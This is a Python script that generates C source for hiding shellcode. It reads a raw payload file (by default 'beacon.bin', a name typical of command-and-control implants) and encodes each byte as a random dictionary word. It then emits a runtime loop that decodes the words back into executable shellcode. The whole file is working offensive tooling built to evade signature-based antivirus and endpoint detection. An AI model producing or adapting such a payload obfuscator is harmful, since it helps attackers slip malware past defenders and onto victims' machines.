import random
import argparse
import sys

def gen_word_combinations(dict_file):
    try:
        with open(dict_file) as dictionary:
            words = dictionary.readlines()
    except FileNotFoundError:
        exit("\n\nThe dictionary you specified does not exist! Please specify a valid file path.\nExiting...\n")

    # Ensure unique words are selected
    words = list(set(word.strip() for word in words))  # Remove duplicates
    
    if len(words) < 256:
        exit("\n\nThe dictionary file does not contain at least 256 unique words!\nExiting...\n")
    
    random_words = random.sample(words, 256)
    return random_words

def get_shellcode(input_file):
    file_shellcode = b''
    try:
        with open(input_file, 'rb') as shellcode_file:
            file_shellcode = shellcode_file.read().strip()
            binary_code = ''.join(f"\\x{byte:02x}" for byte in file_shellcode)
            raw_shellcode = "0" + ",0".join(binary_code.split("\\")[1:])
        return raw_shellcode
    except FileNotFoundError:
        exit("\n\nThe input file you specified does not exist! Please specify a valid file path.\nExiting...\n")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--dictionary", type=str, help="Dictionary file. Defaults to 'dictionary.txt'.")
    parser.add_argument("-i", "--input", type=str, help="File containing raw shellcode.")
    parser.add_argument("-o", "--output", type=str, help="Output file. Defaults to 'generated.c'.")

    args = parser.parse_args()
    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(0)

    dict_file = args.dictionary if args.dictionary else "dictionary.txt"
    input_file = args.input if args.input else "beacon.bin"
    output_file = args.output if args.output else "generated.c"

    words = gen_word_combinations(dict_file)
    
    translation_table = 'unsigned char* translation_table[256] = { ' + ','.join(f'"{word}"' for word in words) + ' };'
    shellcode = get_shellcode(input_file)
    sc_len = len(shellcode.split(','))

    translated_shellcode = 'unsigned char* translated_shellcode[{}] = {{ '.format(sc_len) + ','.join(f'"{words[int(byte, 16)]}"' for byte in shellcode.split(',')) + ' };'
    shellcode_var = "unsigned char shellcode[{}] = {{0}};".format(sc_len)

    generated_forloop = '''
        printf("Translating shellcode!\n");
        for (int sc_index = 0; sc_index < {}; sc_index++) {{
            for (int tt_index = 0; tt_index <= 255; tt_index++) {{
                if (strcmp(translation_table[tt_index], translated_shellcode[sc_index]) == 0) {{
                    shellcode[sc_index] = tt_index;
                    break;
                }}
            }}
        }}
    '''.format(sc_len)
    
    with open(output_file, "w") as outfile:
        outfile.write(translation_table + '\n')
        outfile.write(translated_shellcode + '\n')
        outfile.write(shellcode_var + '\n')
        outfile.write('int sc_len = sizeof(shellcode);\n')
        outfile.write(generated_forloop + '\n')

if __name__ == '__main__':
    main()
